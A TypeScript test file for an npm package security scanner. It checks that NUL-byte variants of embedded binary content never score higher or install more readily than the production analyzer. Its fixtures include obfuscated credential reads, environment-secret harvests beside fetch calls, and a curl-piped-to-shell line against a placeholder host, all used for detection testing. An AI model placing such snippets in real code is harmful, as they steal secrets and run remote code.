// Round 14 review of e2b3b8e, P1: a binary's NUL-deleted view fed the same assessment as its production view, so what
// it found could change how production's own findings were read, not only add to them: a distant dump it found took
// the place of a nearby three-family harvest, exfiltration went, and production's 62 (C), review-first, became 97 (A),
// install. Now production's reading is assessed on its own and the second view only adds signals (score.ts, withExtras),
// so no whole read scores above production's or gets a looser verdict, whatever the second view holds.
//
// The property, against production itself: every recorded case (production-merged.test.ts's nine, and the round 14
// review's), and 25 variants of each with one to three NUL bytes inserted at random (seeded), scored by production
// (274d284) into fixtures/production-nul-variants.json. On every one the score is at most production's, the risk
// signals include production's, and it installs only where production's does. On e2b3b8e 52 of the 338 failed.
import { describe, expect, test } from "bun:test";
import { readFileSync } from "node:fs";
import { join } from "node:path";
import { z } from "zod";
import { analyze, finalize, readingOf, RISK_SIGNALS, SCORE_FLOOR } from "../src/index.ts";
import { machO } from "./executables.ts";

const Recorded = z.array(z.object({ name: z.string(), score: z.number(), coverage: z.string(), risks: z.array(z.string()), ids: z.array(z.string()) }));
const PRODUCTION = Recorded.parse(JSON.parse(readFileSync(join(import.meta.dir, "fixtures", "production-nul-variants.json"), "utf8")));

const BASE = {
  "same line, plain and joined credential, network": "'.npmrc';'.np'+'mrc';fetch('x');",
  "same line, plain and joined credential": "'.npmrc';'.np'+'mrc';",
  "same line, plain and joined names of three kinds": "'child_process';'.npmrc';'chi'+'ld_process';'.np'+'mrc';fetch('x');",
  "two lines, plain then joined": "'.npmrc';\n'.np'+'mrc';fetch('x');",
  "decoded and plain on one line": "require(Buffer.from('Y2hpbGRfcHJvY2Vzcw==','base64').toString());require('child_process');fetch('x');",
  "escaped and plain on one line": "require('\\x63hild_process');require('child_process');",
  "hidden in a comment and in code": "/* '.np'+'mrc' */ '.npmrc';fetch('x');",
  "three-family harvest beside the network": "\n'https';process.env.AWS_SECRET_ACCESS_KEY;process.env.GITHUB_TOKEN;process.env.GOOGLE_API_KEY;fetch('x');\n",
  "a download piped to a shell": "\ncurl -s https://collector.invalid/x.sh | sh\n",
  "round 14: a distant dump, then a three-family harvest beside the network": `\nJSON.stringify(pro\u0000cess.env);\n${"x".repeat(20000)}\nfetch('x');process.env.AWS_SECRET_ACCESS_KEY;process.env.GITHUB_TOKEN;process.env.GOOGLE_API_KEY;\n`,
  "round 14: a distant dump, then a credential read beside the network": `\nJSON.stringify(pro\u0000cess.env);\n${"x".repeat(20000)}\nfetch('x');readFileSync('.npmrc');\n`,
  "round 14: a credential name beside a marker": "\n'.npmrc'; '(deco\u0000ded)';",
  "round 14: a process call beside a run marker": "\nrequire('child_process').exec(x); '(decoded,\u0000 then run)';",
} satisfies Record<string, string>;

const VARIANTS = 25;

function rng(seed: number): () => number {
  let s = seed >>> 0;

  return () => (s = (Math.imul(s, 1664525) + 1013904223) >>> 0) / 2 ** 32;
}

/** Each case and its variants, in the order and with the seeds the fixture was recorded with. */
function cases(): { name: string; tail: string }[] {
  const out: { name: string; tail: string }[] = [];
  let seed = 1;

  for (const [name, base] of Object.entries(BASE)) {
    out.push({ name, tail: base });

    for (let v = 1; v <= VARIANTS; v++) {
      const rand = rng(seed++);
      let t: string = base;
      const n = 1 + Math.floor(rand() * 3);

      for (let k = 0; k < n; k++) {
        const at = Math.floor(rand() * (t.length + 1));
        t = `${t.slice(0, at)}\u0000${t.slice(at)}`;
      }

      out.push({ name: `${name} (NULs ${v})`, tail: t });
    }
  }

  return out;
}

const enc = new TextEncoder();
const STATE = { publishedAt: 0, now: 1e13, deprecated: null, status: "active" as const, statusReason: null };

function report(tail: string) {
  const manifest = { name: "probe", version: "1.0.0", license: "MIT" };
  const data = machO({ size: 256, tail: enc.encode(tail) });
  const a = analyze({ name: "probe", manifest, files: [{ path: "package.json", size: 0, mode: 0o644, data: enc.encode(JSON.stringify(manifest)) }, { path: "lib/b000000", size: data.length, mode: 0o755, data }], publisher: "a", previousPublishers: [] });

  return { a, r: finalize(a, STATE) };
}

const isRisk = (id: string): boolean => RISK_SIGNALS.some((r) => r === id);

/** Whether a reading installs as the install verdict reads it: complete, at or above the floor, no risk, no gap. */
const installs = (x: { score: number; coverage: string; ids: readonly string[] }): boolean => x.score >= SCORE_FLOOR && x.coverage === "complete" && !x.ids.some((id) => isRisk(id) || id === "incomplete" || id === "unanalyzed-files");

describe("a binary's second view only adds: against production, with NUL bytes inserted at random", () => {
  const all = cases();

  test("the fixture is the cases this test makes", () => {
    expect(PRODUCTION.map((p) => p.name)).toEqual(all.map((c) => c.name));
  });

  test(`${all.length} readings: never above production's score, every risk signal production's had, installed only where production's was`, () => {
    const failures: string[] = [];

    all.forEach((c, i) => {
      const want = PRODUCTION[i];

      if (want === undefined) return;
      const { r } = report(c.tail);
      const ids = r.signals.map((s) => s.id);
      const mine = { score: r.score, coverage: r.coverage?.kind ?? "none", ids };

      if (r.score > want.score) failures.push(`${c.name}: ${r.score} above production's ${want.score}`);

      for (const id of want.risks) if (!ids.some((x) => x === id)) failures.push(`${c.name}: lost ${id}`);

      if (installs(mine) && !installs(want)) failures.push(`${c.name}: installs where production's does not`);
    });

    expect(failures).toEqual([]);
  }, 120_000);

  test("the round 14 case: production's 62, exfiltration, review-first", () => {
    const { a, r } = report(BASE["round 14: a distant dump, then a three-family harvest beside the network"]);

    // on e2b3b8e: 97 (A), credential-mention alone, install
    expect(r.score).toBe(62);
    expect(r.signals.map((s) => s.id)).toEqual(["exfiltration", "credential-mention"]);
    expect(readingOf(a).kind).toBe("complete");
  });
});
